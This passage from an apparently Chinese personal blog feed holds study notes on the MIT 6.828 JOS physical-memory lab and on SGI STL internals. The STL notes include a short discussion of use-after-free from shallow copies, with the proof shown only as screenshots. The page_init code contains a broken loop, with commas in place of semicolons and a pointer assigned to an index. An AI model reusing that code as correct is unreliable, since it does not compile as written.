class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">mem_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> cr0;</span><br><span class="line"><span class="type">size_t</span> n;</span><br><span class="line"></span><br><span class="line">i386_detect_memory();</span><br><span class="line"></span><br><span class="line">kern_pgdir = (<span class="type">pde_t</span> *) boot_alloc(PGSIZE);</span><br><span class="line"><span class="built_in">memset</span>(kern_pgdir, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kern_pgdir[PDX(UVPT)] = PADDR(kern_pgdir) | PTE_U | PTE_P;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pages = (<span class="keyword">struct</span> PageInfo* )boot_alloc(npages*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo));</span><br><span class="line"><span class="built_in">memset</span>(pages,<span class="number">0</span>,npages*(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">page_init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir, UPAGES, npages*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo), PADDR(pages), PTE_U|PTE_P);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir,KSTACKTOP-KSTKSIZE,KSTKSIZE,PADDR(bootstack),PTE_W|PTE_P);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir, KERNBASE, (<span class="number">1ULL</span> &lt;&lt; <span class="number">32</span>) - KERNBASE, <span class="number">0</span>, PTE_W);</span><br><span class="line"></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cr0 = rcr0();</span><br><span class="line">cr0 |= CR0_PE|CR0_PG|CR0_AM|CR0_WP|CR0_NE|CR0_MP;</span><br><span class="line">cr0 &amp;= ~(CR0_TS|CR0_EM);</span><br><span class="line">lcr0(cr0);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Part-1-Physical-Page-Management"><a href="#Part-1-Physical-Page-Management" class="headerlink" title="Part 1: Physical Page Management"></a>Part 1: Physical Page Management</h3><p>写page_init之前回顾理解一下物理地址和虚拟地址的布局,在图中指出memlayout.h中各个宏定义表示的位置.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232009006.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232009885.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232010431.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">//设置第一页为inuse,保留实模式下的IDT和BIOS结构</span></span><br><span class="line"><span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">pages[i].pp_link = <span class="literal">NULL</span>;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将Base_memory全部设置为free.(basemem应该指低1MB的内存)</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; npages_basemem; ++i) {</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将IO hole设置为inuse,避免被分配.</span></span><br><span class="line"><span class="keyword">for</span>(i = pa2page(IOPHYSMEM),i&lt;pa2page(EXTPHYSMEM),++i)</span><br><span class="line">{</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">pages[i].pp_link = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将1MB以上的Kernel映像,kern_pgdir以及pages的页设置为inuse.</span></span><br><span class="line"><span class="keyword">for</span>(i = pa2page(EXTPHYSMEM);i&lt;pa2page(PADDR(boot_alloc(<span class="number">0</span>)));++i)</span><br><span class="line">{</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">pages[i].pp_link = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将上方所有物理地址设置为free</span></span><br><span class="line"><span class="keyword">for</span>(;i&lt;npages;++i)</span><br><span class="line">{</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后就是page_alloc(),page_free().<br>如下是初看时的一些疑惑,我知道很蠢hh<br><del>我暂时并不理解这两个功能存在的必要,特别是把释放的物理页对应的pageinfo链入page_free_list链表中的操作.</del><br><del>我们在meminit中已经调用bootalloc为所有的物理页分配了一个对应的pageinfo结构,这些结构即使被page_free释放之后也不会被其他用途的内存分配重用,不存在像常见的内存分配机制的设立是为了提高内存利用率的原因.</del><br>解答:释放pageinfo结构,其实是表示对pageinfo对应物理页的释放与分配,用于操作系统的追踪管理,与提高内存利用率无关.</p><blockquote><p>The operating system must keep track of which parts of physical RAM are free and which are currently in use. JOS manages the PC’s physical memory with page granularity so that it can use the MMU to map and protect each piece of allocated memory.</p></blockquote><p><del>更不理解的,pageinfo结构中并没有记录对应物理页的地址,page2pa函数是通过pageinfo结构相对于pages的偏移来计算出对应的物理页的.但当page_insert调用page_alloc是从free_list中取出最后free的pageinfo结构,不与物理地址对应.</del><br>解答:page_alloc的作用是分配客户(相对于该函数来说)申请的一页的物理地址空间,客户并不在乎该物理地址空间位于哪里,page_alloc只是随便取出一个pageinfo结构,并将该pageinfo结构对应的物理页分配给客户.是先有pageinfo结构再有对应的物理页,而不是为某个特定的物理页分配pageinfo结构,自然不存在无法对应的问题.</p><p>关于pgdir_walk() boot_map_region() page_lookup() page_remove() page_insert()等函数的实现,主要理清内核虚拟地址(KADDR),物理地址,物理页,PageInfo等结构的关系,实现完后跟着check的报错一点点调整.太多了就不放出来了.详见github.</p><h3 id="Part-2-Virtual-Memory"><a href="#Part-2-Virtual-Memory" class="headerlink" title="Part 2: Virtual Memory"></a>Part 2: Virtual Memory</h3><p>详见github.</p><h3 id="Part-3-Kernel-Address-Space"><a href="#Part-3-Kernel-Address-Space" class="headerlink" title="Part 3: Kernel Address Space"></a>Part 3: Kernel Address Space</h3><p>详见github.</p><h4 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h4><h5 id="物理页面映射打印"><a href="#物理页面映射打印" class="headerlink" title="物理页面映射打印"></a>物理页面映射打印</h5><p>模仿实验中qemu的info pg命令实现showmappings.<br>合并打印原则是权限位相同且物理页相邻的页表合并打印,页目录表始终不合并.其实改进也简单但是时间挺紧的…<br>qemu中的info pg:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271912082.png"><br>showmappings:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271913080.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271926936.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271914406.png"></p><h4 id="一些小插曲"><a href="#一些小插曲" class="headerlink" title="一些小插曲"></a>一些小插曲</h4><p>memset崩了,刚开始猜测是引用到了当前页目录映射之外的物理地址,到崩溃现场之后发现又没问题,找了半天发现原来页目录表中虚拟地址低4MB没有写的权限。。。<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232256150.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((__aligned__(PGSIZE)))</span><br><span class="line"><span class="type">pde_t</span> entry_pgdir[NPDENTRIES] = {</span><br><span class="line"><span class="comment">// Map VA's [0, 4MB) to PA's [0, 4MB)</span></span><br><span class="line">[<span class="number">0</span>]</span><br><span class="line">= ((<span class="type">uintptr_t</span>)entry_pgtable - KERNBASE) + PTE_P,</span><br><span class="line"><span class="comment">// Map VA's [KERNBASE, KERNBASE+4MB) to PA's [0, 4MB)</span></span><br><span class="line">[KERNBASE&gt;&gt;PDXSHIFT]</span><br><span class="line">= ((<span class="type">uintptr_t</span>)entry_pgtable - KERNBASE) + PTE_P + PTE_W</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>又突然想到page_init后,page_free_list指向的头部页应该位于物理内存的最高处,确实是在当前页目录映射之外的,确实应该崩.检查之后发现在check_page_free_list函数中有这样一个处理free_list的操作.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (only_low_memory) {</span><br><span class="line"><span class="comment">// Move pages with lower addresses first in the free</span></span><br><span class="line"><span class="comment">// list, since entry_pgdir does not map all pages.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp1</span>, *<span class="title">pp2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> **<span class="title">tp</span>[2] =</span> { &amp;pp1, &amp;pp2 };</span><br><span class="line"><span class="keyword">for</span> (pp = page_free_list; pp; pp = pp-&gt;pp_link) {</span><br><span class="line"><span class="type">int</span> pagetype = PDX(page2pa(pp)) &gt;= pdx_limit;</span><br><span class="line">*tp[pagetype] = pp;</span><br><span class="line">tp[pagetype] = &amp;pp-&gt;pp_link;</span><br><span class="line">}</span><br><span class="line">*tp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">*tp[<span class="number">0</span>] = pp2;</span><br><span class="line">page_free_list = pp1;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SGI STL学习笔记</title>
      <link href="/2023/SGI-STL--Notes/"/>
      <url>/2023/SGI-STL--Notes/</url>
      
        <content type="html"><![CDATA[<p>所有内容均基于SGI STL.该项目仅作为本人学习C++STL库,数据结构与算法使用.</p><h2 id="内存置配器"><a href="#内存置配器" class="headerlink" title="内存置配器"></a>内存置配器</h2><p>容器使用内存置配器来进行内存空间的分配和释放.<br>为了适配STL标准,在实际使用的分配器实现一个上层接口类simple_alloc.该类默认使用第二级分配器</p><h3 id="第一级分配器-malloc-alloc-template"><a href="#第一级分配器-malloc-alloc-template" class="headerlink" title="第一级分配器 malloc_alloc_template"></a>第一级分配器 malloc_alloc_template</h3><p>该分配器在内部直接使用operator new/delete进行内存管理</p><h3 id="第二级分配器-default-alloc-template"><a href="#第二级分配器-default-alloc-template" class="headerlink" title="第二级分配器 default_alloc_template"></a>第二级分配器 default_alloc_template</h3><p>该分配器以小型内存池进行内存管理,减轻分配内存时的cookie占用的内存.</p><span id="more"></span><h4 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h4><p>维护一个free_list数组,每一个free_list是一个存放未分配内存的单向链表(的头指针).用来管理释放或未分配的内存.<br>另外维护两个所有二级分配器共用的静态指针start_free和end_free,分别指向空闲内存(空闲且未链入free_list)的首尾.<br>还有一个size_t类型的heap_size成员,在重新向操作系统malloc内存时会用到其来计算需要申请的空间大小,但不太懂其存在的意义.</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h5><p>当容器使用alloc分配空间时,若内存超过128bytes(MAX_BYTES)使用第一级分配器进行内存分配.反之使用第二级.</p><p>首先检查对应大小的free_list是否存在未分配空间.若有就直接取出.<br>如果没有,调用refill函数用空闲内存区域先填充free_list(内存充足的情况下每次链入20块),再取出一块完成分配.<br>refill函数其实只负责将从空闲内存区域取出的空间链入free_list,实际的取出工作由chunk_alloc函数完成.</p><p>chunk_alloc函数先检查空闲区域是否足够取出20个对应大小的堆块,若不够则能取多少个取多少.如果一个的空间都不够,就先将空闲区域整个链入free_list对应大小链表中.然后调用malloc函数向系统申请2*20*nbytes(一个元素的大小)字节的空间.如果malloc失败,则从更大的freelist链表(单个obj&gt;nbytes)中取出一个chunk作为新的空闲区域.</p><h5 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h5><p>若内存超过128bytes,使用第一级分配器释放内存.<br>否则使用第二级分配器直接链入对应free_list中.</p><p>值得注意的时,第二级分配器并没有对free_list以及start_free~end_free之间区域的释放操作,这一操作最后将由操作系统完成?<br><a href="https://www.zhihu.com/question/38524347">STL allocator何时释放内存？</a></p><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>迭代器用来粘合算法和容器.</p><h4 id="Traits技法"><a href="#Traits技法" class="headerlink" title="Traits技法"></a>Traits技法</h4><h5 id="template参数推导机制"><a href="#template参数推导机制" class="headerlink" title="template参数推导机制"></a>template参数推导机制</h5><p>在算法中使用迭代器时,可能会使用到迭代器所指之物的型别,该型别可以利用template参数推导机制完成.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">I</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(I iter)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">func2</span>(iter,*iter);<span class="comment">//func2可通过参数推导机制获得iter所指型别</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>但如果func函数需要返回一个iter指向的对象,template推导机制就不起作用了</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//下列写法无法通过编译</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">I</span>&gt;</span><br><span class="line">(*I) <span class="built_in">func</span>(I iter)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">func2</span>(iter,*iter);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="内嵌型别声明"><a href="#内嵌型别声明" class="headerlink" title="内嵌型别声明"></a>内嵌型别声明</h5><p>我们可以使用内嵌型别声明的方法解决该问题.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Iterator</span>{</span><br><span class="line"><span class="keyword">typedef</span> T value_type;</span><br><span class="line">......</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">I</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">typename</span> I::value_type <span class="title">func</span><span class="params">(I iter)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">func2</span>(iter,*iter);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>对于泛型算法,不仅需要接受迭代器,还需要能够接受一个原生指针作为参数,而原生指针没有,我们也无法为其内嵌一个名为value_type的变量<br>于是需要用到traits技法</p><h5 id="Traits"><a href="#Traits" class="headerlink" title="Traits"></a>Traits</h5><p>使用中间层traits,利用template参数推导机制进行偏特化,将原生指针和迭代器统一.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304061931218.webp"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">iterator_traits</span> {</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> T::value_type value_type;</span><br><span class="line">};</span><br><span class="line"><span class="comment">// 偏特化1</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">iterator_traits</span>&lt;T*&gt; {</span><br><span class="line">    <span class="keyword">typedef</span> T value_type;</span><br><span class="line">};</span><br><span class="line"><span class="comment">// 偏特化2</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">iterator_traits</span>&lt;<span class="type">const</span> T*&gt; {</span><br><span class="line">    <span class="keyword">typedef</span> T value_type;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>根据迭代器操作容器元素的方式,分为InputIterator和OutputIterator<br>根据迭代器遍历容器的方式,分为ForwardIterator,BidirectionalIterator,RandomAccessIterator等.</p><p>为了使函数能够获取迭代器的类型,将类型标签定义为一个新类型,再以traits方式型别声明为category,使用时进行萃取.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">input_iterator_tag</span>{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">output_iterator_tag</span>{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">forward_iterator_tag</span>:<span class="keyword">public</span> input_iterator_tag{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">bidirectional_iterator_tag</span>:<span class="keyword">public</span> forward_iterator_tag{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">random_access_iterator_tag</span>:<span class="keyword">public</span> bidirectional_iterator_tag{};</span><br></pre></td></tr></tbody></table></figure><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><p>单端开口的连续线性空间容器</p><h4 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h4><p>由于该容器的空间是连续线性的,故其迭代器为原生指针.迭代器在扩容后失效</p><h4 id="成员变量-1"><a href="#成员变量-1" class="headerlink" title="成员变量"></a>成员变量</h4><p>维护了三个指针(即vector的迭代器类型),start指向vector已存储区域的开头,finish指向vector中已存储区域的末尾,end_of_storage指向vector总存储空间的末尾.</p><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><p>加入新元素时,若存储空间充足就直接在finish构造元素,若存储空间不足便申请二倍存储空间,将原空间内容拷贝到新申请的空间,再释放掉原有空间.<br>由于扩容操作会使vector中所有元素迁移,故迭代器失效.</p><h4 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h4><p>由于迭代器失效,若程序有对迭代器的保存动作,可能造成uaf,double free等安全问题.</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>两端开口的双向环状链表</p><h4 id="迭代器-2"><a href="#迭代器-2" class="headerlink" title="迭代器"></a>迭代器</h4><p>Bidirectional迭代器.内嵌一个链表结点指针.以链表结点的指针完成迭代.迭代器不会失效</p><h4 id="成员变量-2"><a href="#成员变量-2" class="headerlink" title="成员变量"></a>成员变量</h4><p>仅维护一个环状链表中的空结点指针</p><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><p>和普通双向环状链表区别不大.<br>注意一下5个基本操作,有助于对list空间结构的想象.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iterator <span class="title function_">begin</span><span class="params">()</span> { <span class="keyword">return</span> (link_type)(node-&gt;next); }</span><br><span class="line">iterator <span class="title function_">end</span><span class="params">()</span> { <span class="keyword">return</span> (link_type)node; }</span><br><span class="line"><span class="type">bool</span> <span class="title function_">empty</span><span class="params">()</span> { <span class="keyword">return</span> node-&gt;next == node; }</span><br><span class="line">reference <span class="title function_">front</span><span class="params">()</span> { <span class="keyword">return</span> *begin(); }</span><br><span class="line">reference <span class="title function_">back</span><span class="params">()</span> { <span class="keyword">return</span> *(--end()); }</span><br></pre></td></tr></tbody></table></figure><h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><p>两端开口的连续线性空间.(连续线性空间实则是伪造的)</p><h4 id="迭代器-3"><a href="#迭代器-3" class="headerlink" title="迭代器"></a>迭代器</h4><p>内含四个指针,分别为value_type*类型的cur,first,last分别指向所在缓冲区的当前元素,头部,尾部.另一个map_pointer指向deque的管控中心map(不是STL中的容器map)</p><p>deque的连续线性空间伪造主要依靠的便是迭代器,迭代器在到达一片缓冲区的末尾时跳跃到下一缓冲区或到达开头时跳转到上一个缓冲区,伪造出连续的空间.</p><h4 id="成员变量-3"><a href="#成员变量-3" class="headerlink" title="成员变量"></a>成员变量</h4><p>指向map的指针和map_size.迭代器start,finish分别关联第一个和最后一个缓冲区</p><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h4><p>主要是map的扩容.</p><h3 id="RB-tree"><a href="#RB-tree" class="headerlink" title="RB-tree"></a>RB-tree</h3><p>具有排序的平衡二叉树,用于快速查找.</p><h4 id="迭代器-4"><a href="#迭代器-4" class="headerlink" title="迭代器"></a>迭代器</h4><p>内含一个指向树结点的指针,increment和decrement操作使迭代器指向比当前结点值大的最小元素.(对迭代器而言并没有”大小”的概念,例如increment只是简单的移动到右节点,然后持续移动到左叶子结点.”大小的概念由容器插入节点的树成长过程体现”)</p><h4 id="成员变量-4"><a href="#成员变量-4" class="headerlink" title="成员变量"></a>成员变量</h4><p>一个header指针,一个node_count,一个用于元素比较的仿函数.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141728705.png"></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p>主要学习函数dispatch<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304091803715.png"></p><h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><p>push_heap:新加入的元素放在最后一个结点,循环与父节点比较判断是否交换.<br>pop_heap:将根节点的值与最后一个结点的值交换(交换只是一种说法,实际实现可以不同),让最后一个结点进行下溯交换,直到回到根节点当前位置的前一个.<br>sort_heap:反复进行pop_heap,每次将finish-1即可排序.<br>make_heap:使用pop_heap类似的下溯操作,从最后一个父节点开始依次进行下溯后再使用push_heap操作完成实质的父子结点比较排序过程.</p><p>要注意一点,下溯操作仅是下放某个结点,并不涉及排序.所以《STL源码剖析》一书中侯捷的注释是错误的.按书上更改后,pop_heap调用时若左叶子结点的值小于右叶子节点的值发生错误,make_heap调用时也是错误.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309111124768.png"></p><h2 id="配接器"><a href="#配接器" class="headerlink" title="配接器"></a>配接器</h2><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>单端开口先进先出.<br>Stack内部以deque为底层容器进行封装,不存在迭代器.也可以以list为底层容器.</p><h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><p>单端开口先进后出<br>Queue内部以deque为底层容器进行封装,不存在迭代器.也可以以list为底层容器.</p><h3 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h3><p>单端开口,出队顺序由排序方式决定.<br>以vector为底层容器进行封装,算法主要由heap算法实现.</p><h3 id="set-map"><a href="#set-map" class="headerlink" title="set map"></a>set map</h3><p>默认均以rb_tree为底层容器,区别是前者键值相同,后者键值类型不一定相同.</p><h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><h2 id="思考题1"><a href="#思考题1" class="headerlink" title="思考题1"></a>思考题1</h2><blockquote><p>在写容器的时候 容器里有很多的成员函数或者非成员函数 。有的容器都有对元素的增删操作 ，那么这些操作在如何不恰当使用的情况下，会造成安全问题请构造出poc来 。</p></blockquote><h3 id="漏洞1"><a href="#漏洞1" class="headerlink" title="漏洞1"></a>漏洞1</h3><p>这个其实不能算是容器的增删操作导致的,而是所有类中指针的通病.<br>在没有重载复制(构造)函数情况下,默认的复制(构造)函数会直接复制指针的值(浅拷贝),当其中一个对象销毁时释放掉指针内存而另一个对象还保留着已释放内存的指针.<br>如图,vec和vec2使用同一块内存,若vec被销毁,vec2中仍存有该内存指针造成uaf.<br>(由于STL二级空间置配器并未真正释放内存给操作系统,所以asan并未检测到double free)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304162312107.png"><br>改用一级空间置配器检测到double free.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304162322079.png"></p><p>重载拷贝构造函数后正常:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141856874.png"></p><h2 id="思考题2"><a href="#思考题2" class="headerlink" title="思考题2"></a>思考题2</h2><blockquote><p>为什么实现了uninitialized_xxx和copy/fill这样两组不同的函数</p></blockquote><ul><li><code>uninitialized_xx</code>函数，其内部会执行结构体的构造函数。该函数面向于<code>尚未进行初始化</code>的内存。</li><li>而没有“<code>uninitialized_</code>”前缀的函数，面向的是<code>已经初始化过</code>的内存。所以不需要再执行构造函数而是直接拷贝赋值。</li></ul><p>对已包含元素的内存中调用uninitialized_copy,可能导致对象未析构,或者出现问题1同样的情况,如copy,因重载的赋值运算符未被调用而导致浅拷贝的发生.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141803372.png"></p><h2 id="思考题3"><a href="#思考题3" class="headerlink" title="思考题3"></a>思考题3</h2><blockquote><p>理解每个容器的内存模型。</p></blockquote><ul><li>vector的内存模型是一个数组。</li><li>list的内存模型是一个带空结点的双向循环链表.</li><li>deque的内存模型是多个buffer缓冲区和管理buffer的map数组.</li><li>set,map的内存模型是平衡二叉树(红黑树)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 程序设计 </category>
          
          <category> SGI-STL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL </tag>
            
            <tag> CPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2023六月挑战赛｜二进制专项 复现</title>
      <link href="/2023/DASCTF-2023-June-Binary-WP/"/>
      <url>/2023/DASCTF-2023-June-Binary-WP/</url>
      
